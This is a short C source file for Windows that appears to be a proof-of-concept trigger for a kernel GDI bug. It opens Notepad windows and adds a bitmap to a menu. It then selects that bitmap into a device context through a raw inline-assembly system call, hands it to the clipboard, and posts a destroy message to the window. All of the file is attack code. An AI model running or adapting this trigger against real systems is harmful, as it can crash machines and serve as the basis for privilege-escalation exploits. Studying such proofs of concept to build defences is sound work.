#include "stdafx.h"
#include <Windows.h>

HWND Start(LPCSTR fn) {
	FILE *f = 0x0;
	fopen_s(&f, fn, "w");
	fclose(f);
	ShellExecuteA(0x0, "open", "notepad.exe", fn, 0x0, SW_SHOW);
	Sleep(250);
	char buf[1024];
	sprintf_s(buf, 1024, "%s - Notepad", fn);
	return FindWindowA(0x0, buf);
}


__declspec(noinline) int __stdcall NtGdiSelectBitmap(HDC hdc, HBITMAP hbmp) {
	printf("[-] NtGdiSelectBitmap %08x, %08x\n", hdc, hbmp);
	__asm {
			push hbmp
			push hdc
			push 0x0
			mov eax, 0x110b
			mov edx, 0x7ffe0300
			call  dword ptr [edx]
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	HDC hdc1 = GetDC((HWND)0x0);
	printf("[-] hdc1: %08x\n", hdc1);
	HWND hwnd1 = Start("test1.txt");
	printf("[-] hwnd1: %08x\n", hwnd1);
	HMENU hmenu1 = GetMenu(hwnd1);
	printf("[-] hmenu1: %08x\n", hmenu1);
	HDC hdc2 = CreateCompatibleDC(hdc1);
	printf("[-] hdc2: %08x\n", hdc2);
	HBITMAP hbmp1 = LoadBitmapW(0x0, (LPCWSTR)0x7fe2);
	printf("[-] hbmp1: %08x\n", hbmp1);
	InsertMenuW(hmenu1, 0x4, 0x14, 0x0, (LPCWSTR)hbmp1);
	NtGdiSelectBitmap(hdc2, hbmp1);
	HWND hwnd2 = Start("test2.txt");
	OpenClipboard(hwnd2);
	SetClipboardData(0x2, hbmp1);
	PostMessage(hwnd1, 0x2, 0x0, 0x0);
	getchar();
	return 0;
}
